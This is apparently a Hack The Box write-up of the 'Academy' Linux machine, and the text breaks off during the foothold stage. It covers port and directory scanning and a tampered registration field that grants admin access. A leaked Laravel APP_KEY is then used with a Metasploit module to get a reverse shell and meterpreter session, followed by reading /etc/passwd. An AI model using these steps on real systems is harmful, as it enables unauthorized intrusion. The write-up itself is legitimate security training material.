@@ -1,0 +1,1033 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Joe Ammond (pugpug)">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
+    
+    
+      
+        <title>Academy - pugpug's Hack The Box writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bb3983ee.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../css/print.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#academy-linux-easy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="pugpug&#39;s Hack The Box writeups" class="md-header__button md-logo" aria-label="pugpug's Hack The Box writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            pugpug's Hack The Box writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Academy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="pugpug&#39;s Hack The Box writeups" class="md-nav__button md-logo" aria-label="pugpug's Hack The Box writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    pugpug's Hack The Box writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Machines
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Machines" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Machines
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Academy
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Academy
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user" class="md-nav__link">
+    User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root" class="md-nav__link">
+    Root
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    Final thoughts
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Forge/" class="md-nav__link">
+        Forge
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user" class="md-nav__link">
+    User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root" class="md-nav__link">
+    Root
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    Final thoughts
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="academy-linux-easy">Academy (Linux easy)<a class="headerlink" href="#academy-linux-easy" title="Permanent link">#</a></h1>
+<p><img alt="Academy info card" src="../../img/Academy/00.png" /></p>
+<p>Academy is a straightforward machine from
+<a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> and
+<a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a>. We'll be covering web app exploitation,
+web framewok vulnerabilities, unforseen side-effects leading to credential exposure, and 
+priviledge abuse in our path from remote to user to root.</p>
+<h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link">#</a></h2>
+<p>After adding <code>10.10.10.215 academy.htb</code> to <code>/etc/hosts</code>, I performed my standard recon for open
+ports on the machine: <code>nmap  -sS -sV -Pn -v -p- -sC -oA academy academy.htb</code>:</p>
+<div class="highlight"><pre><span></span><code>Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 20:06 UTC
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:06
+Completed NSE at 20:06, 0.00s elapsed
+Initiating NSE at 20:06
+Completed NSE at 20:06, 0.00s elapsed
+Initiating NSE at 20:06
+Completed NSE at 20:06, 0.00s elapsed
+Initiating SYN Stealth Scan at 20:06
+Scanning academy.htb (10.10.10.215) [65535 ports]
+Discovered open port 80/tcp on 10.10.10.215
+Discovered open port 22/tcp on 10.10.10.215
+Discovered open port 33060/tcp on 10.10.10.215
+Completed SYN Stealth Scan at 20:07, 31.11s elapsed (65535 total ports)
+Initiating Service scan at 20:07
+Scanning 3 services on academy.htb (10.10.10.215)
+Completed Service scan at 20:07, 23.39s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.215.
+Initiating NSE at 20:07
+Completed NSE at 20:07, 1.38s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.17s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Nmap scan report for academy.htb (10.10.10.215)
+Host is up (0.045s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Hack The Box Academy
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message&quot;
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.91%I=7%D=1/12%Time=5FFE0173%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOp
+SF:tions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVers
+SF:ionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,2
+SF:B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fI
+SF:nvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)
+SF:%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCookie
+SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\x
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;
+SF:\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9
+SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY0
+SF:00&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,
+SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\
+SF:x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPOptions
+SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,&quot;
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000
+SF:&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r
+SF:(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\
+SF:x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Initiating NSE at 20:07
+Completed NSE at 20:07, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.52 seconds
+           Raw packets sent: 65647 (2.888MB) | Rcvd: 65535 (2.621MB)
+</code></pre></div>
+<p>We see 3 open ports, <code>22</code>, <code>80</code>, and <code>33060</code>. Opening port <code>80</code> in Firefox gives us the
+following screen:</p>
+<p><img alt="Academy opening page" src="../../img/Academy/01.png" /></p>
+<p>There's a Login page:</p>
+<p><img alt="Academy Login page" src="../../img/Academy/02.png" /></p>
+<p>and a Registration page:</p>
+<p><img alt="Academy Registration page" src="../../img/Academy/03.png" /></p>
+<p>Let's see what other pages are on the machine. My preferred tool for this is <code>gobuster</code>:</p>
+<p><code>gobuster dir --url=http://academy.htb -w /usr/share/wordlists/dirb/big.txt -x php,txt,Z,gz,zip</code></p>
+<div class="highlight"><pre><span></span><code>===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://academy.htb
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt,Z,gz,zip
+[+] Timeout:        10s
+===============================================================
+2021/01/12 20:13:50 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.Z (Status: 403)
+/.htaccess.gz (Status: 403)
+/.htaccess.zip (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.Z (Status: 403)
+/.htpasswd.gz (Status: 403)
+/.htpasswd.zip (Status: 403)
+/admin.php (Status: 200)
+/config.php (Status: 200)
+/home.php (Status: 302)
+/images (Status: 301)
+/index.php (Status: 200)
+/login.php (Status: 200)
+/register.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/01/12 20:22:24 Finished
+===============================================================
+</code></pre></div>
+<p>So in addition to <code>login.php</code> and and <code>register.php</code>, there is an Admin page at <code>admin.php</code>, a
+configuration file at <code>config.php</code>, and a <code>home.php</code> that we're not authorized to see.</p>
+<p>Configuring the browser to send traffic through <code>[ZAP](https://www.zaproxy.org)</code> and submitting
+a registration allows us to log in:</p>
+<p><img alt="Logged in home page" src="../../img/Academy/04.png" /></p>
+<p><code>ZAP</code> shows us the <code>POST</code> data sent to the web server.</p>
+<p><img alt="POST registration data" src="../../img/Academy/05.png" /></p>
+<p>The fields look like what we filled out in the Registration page, with one addition: <code>roleid=0</code>. 
+We may be able to create an 'administrator' account if we set <code>roleid=1</code>. Sending the <code>POST</code>
+data to ZAP's Request Editor allows us to edit <code>roleid=1</code> and re-submit the post. </p>
+<p><img alt="POST with 'roleid=1'" src="../../img/Academy/06.png" /></p>
+<p>We receive a <code>200</code> response code, which (hopefully) means the registration is successful. Attempting
+to log in with our newly created account on <code>admin.php</code> takes us to this page:</p>
+<p><img alt="admin-page.php" src="../../img/Academy/07.png" /></p>
+<p>Bingo! We've discovered a couple of new accounts: <code>cry0l1t3</code> and <code>mrb3n</code>, as well as a virtual host
+we didn't know about before. Adding it to the entry for <code>academy</code> in <code>/etc/hosts</code> and visiting it
+in the browser yields a treasure trove of information (click for high resolution picture):</p>
+<p><a href="../../img/Academy/08.png" target="_blank"><img alt="Laravel error dump" src="../../img/Academy/thm_08.png" title="Laravel error dump" /></a></p>
+<p>Scrolling the bottom right pane, we see even more data:</p>
+<p><img alt="Laravel errors 1" src="../../img/Academy/09.png" />
+<img alt="Laravel errors 2" src="../../img/Academy/10.png" />
+<img alt="Laravel errors 3" src="../../img/Academy/11.png" /></p>
+<p>From this screen, we can discern a lot of information about the web server and what it's running:</p>
+<ul>
+<li>The web framework appears to be <a href="https://laravel.com/">Laravel</a>, a PHP web framework.</li>
+<li>The web server is Apache version <code>2.4.41</code>, and running on an Ubuntu OS.</li>
+<li>MySQL is running on the server, listening on port <code>3306</code>, and we see some possible credentials: <code>homestead:secret</code>. This may be the service listening on port <code>33060</code> as well.</li>
+<li>There are refernces to a Redis server on the host.</li>
+<li>The web application is installed in <code>/var/www/html/htb-academy-dev-01</code>.</li>
+<li>We have part of the Laravel framework configuration exposed: the <strong>APP_KEY</strong>: <code>base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</code></li>
+</ul>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">#</a></h2>
+<p>The Laravel framework presents a good place to start looking for potential vulnerabilities. 
+searching <a href="https://www.exploit-db.com/">Exploit DB</a> for <code>laravel</code> yields a few interesting results:</p>
+<p><img alt="Exploit DB 'laravel' results" src="../../img/Academy/17.png" /></p>
+<p>The <code>Metasploit</code> vulnerability looks promising: it's relatively recent and has been
+verified. Firing up <code>msfconsole</code> and looking at the module info shows we need the
+remote host <code>(RHOST)</code>, the virtual server name <code>(VHOST)</code>, and the <code>APP_KEY</code> we found
+in the dump above. Let's give the module a try:</p>
+<div class="highlight"><pre><span></span><code><span class="go">msf6 &gt; use exploit/unix/http/laravel_token_unserialize_exec</span>
+<span class="go">[*] Using configured payload cmd/unix/reverse_perl</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set LHOST tun0</span>
+<span class="go">LHOST =&gt; tun0</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set RHOSTS 10.10.10.215</span>
+<span class="go">RHOSTS =&gt; 10.10.10.215</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set VHOST dev-staging-01.academy.htb</span>
+<span class="go">VHOST =&gt; dev-staging-01.academy.htb</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span>
+<span class="go">APP_KEY =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; exploit -j</span>
+<span class="go">[*] Exploit running as background job 0.</span>
+<span class="go">[*] Exploit completed, but no session was created.</span>
+<span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt;</span>
+<span class="go">[*] Started reverse TCP handler on 10.10.14.251:4444</span>
+<span class="go">[*] Command shell session 1 opened (10.10.14.251:4444 -&gt; 10.10.10.215:41432) at 2021-01-13 19:30:11 +0000</span>
+</code></pre></div>
+<p>And there we have a session created. Let's upgrade it to a <code>meterpreter</code> session for more flexibility:</p>
+<div class="highlight"><pre><span></span><code><span class="go">msf6 exploit(unix/http/laravel_token_unserialize_exec) &gt; use post/multi/manage/shell_to_meterpreter</span>
+<span class="go">msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1</span>
+<span class="go">SESSION =&gt; 1</span>
+<span class="go">msf6 post(multi/manage/shell_to_meterpreter) &gt; run</span>
+
+<span class="go">[*] Upgrading session ID: 1</span>
+<span class="go">[*] Starting exploit/multi/handler</span>
+<span class="go">[*] Started reverse TCP handler on 10.10.14.251:4433</span>
+<span class="go">[*] Sending stage (976712 bytes) to 10.10.10.215</span>
+<span class="go">[*] Meterpreter session 2 opened (10.10.14.251:4433 -&gt; 10.10.10.215:46886) at 2021-01-13 19:34:15 +0000</span>
+<span class="go">[*] Command stager progress: 100.00% (773/773 bytes)</span>
+<span class="go">[*] Post module execution completed</span>
+<span class="go">msf6 post(multi/manage/shell_to_meterpreter) &gt;</span>
+<span class="go">[*] Stopping exploit/multi/handler</span>
+
+<span class="go">msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions 2</span>
+<span class="go">[*] Starting interaction with 2...</span>
+
+<span class="go">meterpreter &gt;</span>
+<span class="go">meterpreter &gt; getuid</span>
+<span class="go">sServer username: www-data @ academy (uid=33, gid=33, euid=33, egid=33)</span>
+<span class="go">meterpreter &gt; sysinfo</span>
+<span class="go">Computer     : 10.10.10.215</span>
+<span class="go">OS           : Ubuntu 20.04 (Linux 5.4.0-52-generic)</span>
+<span class="go">Architecture : x64</span>
+<span class="go">BuildTuple   : i486-linux-musl</span>
+<span class="go">Meterpreter  : x86/linux</span>
+<span class="go">meterpreter &gt;</span>
+</code></pre></div>
+<p>And there we have our foothold, a <code>meterpreter</code> session on the host, running as
+<code>www-admin</code>. We can grab the <code>passwd</code> file for information on other accounts to target:</p>
+<div class="highlight"><pre><span></span><code><span class="go">meterpreter &gt; cat /etc/passwd</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash</span>
+<span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="go">...</span>
+<span class="go">egre55:x:1000:1000:egre55:/home/egre55:/bin/bash</span>
+<span class="go">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span>
+<span class="go">mrb3n:x:1001:1001::/home/mrb3n:/bin/sh</span>
+<span class="go">cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh</span>
+<span class="go">mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="go">21y4d:x:1003:1003::/home/21y4d:/bin/sh</span>
+<span class="go">ch4p:x:1004:1004::/home/ch4p:/bin/sh</span>
+<span class="go">g0blin:x:1005:1005::/home/g0blin:/bin/sh</span>
+</code></pre></div>
+<p><code>egre55</code>, <code>cry0l1t3</code>, and <code>mrb3n</code> we knew about, the last 3 are new.</p>
+<p>Let's go poke around in the web root. The <code>Metasploit</code> module we used mentions a <code>.env</code> file
+that <code>Laravel</code> uses to configure various settings, there may be others worth looking at.</p>
+<div class="highlight"><pre><span></span><code><span class="go">meterpreter &gt; cd /var/www/html</span>
+<span class="go">meterpreter &gt; ls</span>
+<span class="go">Listing: /var/www/html</span>
+<span class="go">======================</span>
+
+<span class="go">Mode              Size  Type  Last modified              Name</span>
+<span class="go">----              ----  ----  -------------              ----</span>
+<span class="go">40755/rwxr-xr-x   4096  dir   2021-01-13 19:25:26 +0000  academy</span>
+<span class="go">40755/rwxr-xr-x   4096  dir   2020-08-13 12:40:29 +0000  htb-academy-dev-01</span>
+<span class="go">100644/rw-r--r--  50    fil   2020-08-09 15:49:40 +0000  index.php</span>
+
+<span class="go">meterpreter &gt; cd academy</span>
+<span class="go">meterpreter &gt; ls</span>
+<span class="go">Listing: /var/www/html/academy</span>
+<span class="go">==============================</span>
+
+<span class="go">Mode              Size     Type  Last modified              Name</span>
+<span class="go">----              ----     ----  -------------              ----</span>
+<span class="go">100644/rw-r--r--  706      fil   2020-08-13 12:42:01 +0000  .env</span>
+<span class="go">100644/rw-r--r--  651      fil   2020-08-09 15:49:40 +0000  .env.example</span>
+<span class="go">100644/rw-r--r--  111      fil   2020-08-09 15:49:40 +0000  .gitattributes</span>
+<span class="go">100644/rw-r--r--  155      fil   2020-08-09 15:49:40 +0000  .gitignore</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  app</span>
+<span class="go">100755/rwxr-xr-x  1686     fil   2020-08-09 15:49:40 +0000  artisan</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  bootstrap</span>
+<span class="go">100644/rw-r--r--  1512     fil   2020-08-09 15:49:40 +0000  composer.json</span>
+<span class="go">100644/rw-r--r--  191621   fil   2020-08-09 15:49:40 +0000  composer.lock</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  config</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  database</span>
+<span class="go">100644/rw-r--r--  2956188  fil   2021-01-13 19:26:47 +0000  hehe</span>
+<span class="go">100644/rw-r--r--  1150     fil   2020-08-09 15:49:40 +0000  package.json</span>
